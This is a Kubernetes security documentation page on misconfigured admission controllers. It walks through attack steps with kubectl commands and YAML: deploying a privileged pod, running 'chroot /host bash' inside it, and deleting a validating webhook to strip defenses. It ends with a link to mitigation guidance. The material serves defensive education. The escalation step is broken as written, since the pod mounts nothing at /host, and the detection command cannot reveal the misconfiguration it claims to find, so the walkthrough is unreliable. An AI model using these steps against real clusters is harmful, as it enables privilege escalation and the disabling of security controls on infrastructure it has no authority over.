---
sidebar_position: 7
title: "Misconfigured Admission Controllers"
description: "How attackers exploit misconfigured Kubernetes Admission Controllers to bypass security policies and escalate privileges."
---

# Misconfigured Admission Controllers

**Admission Controllers** act as gatekeepers in Kubernetes, **validating or modifying API requests** before they are persisted. If **misconfigured**, attackers can bypass security policies, deploy unauthorized workloads, and escalate privileges.

---

## Exploitation Steps: Bypassing Kubernetes Admission Controls

An attacker exploits misconfigured **admission controllers** to run privileged or malicious workloads.

### Step 1: Identify Weak Admission Controller Settings

The attacker checks if any admission controllers are misconfigured or disabled:

```bash
kubectl api-versions | grep admissionregistration.k8s.io
```

If key admission controllers (e.g., **PodSecurity, ValidatingWebhookConfiguration**) are missing or misconfigured, the attacker proceeds.

### Step 2: Deploy a Privileged Pod

If **no admission controller enforces security policies**, the attacker creates a privileged pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: exploit-pod
spec:
  containers:
    - name: attacker-container
      image: alpine
      securityContext:
        privileged: true
```

```bash
kubectl apply -f exploit-pod.yaml
```

### Step 3: Escalate Privileges

If no **Validating Admission Controller** blocks it, the attacker gains root access on the host:

```bash
kubectl exec -it exploit-pod -- /bin/sh
chroot /host bash
```

### Step 4: Modify Cluster Policies

If an attacker has access to modify webhooks, they can disable security restrictions:

```bash
kubectl delete validatingwebhookconfiguration security-webhook
```

### Result

The attacker now has **root access** to the Kubernetes node and can **modify cluster-wide security settings**, potentially **disabling future defenses**.

---

## Mitigation Steps

To protect against **misconfigured admission controllers**, follow the security best practices outlined in:

➡ **[Securing Kubernetes Admission Controllers](/docs/best_practices/cluster_setup_and_hardening/misconfigured_admission_controllers_mitigation)**

This guide covers techniques such as **enforcing failure policies, securing webhooks with RBAC, monitoring changes, and restricting admission controller access** to prevent security bypasses.
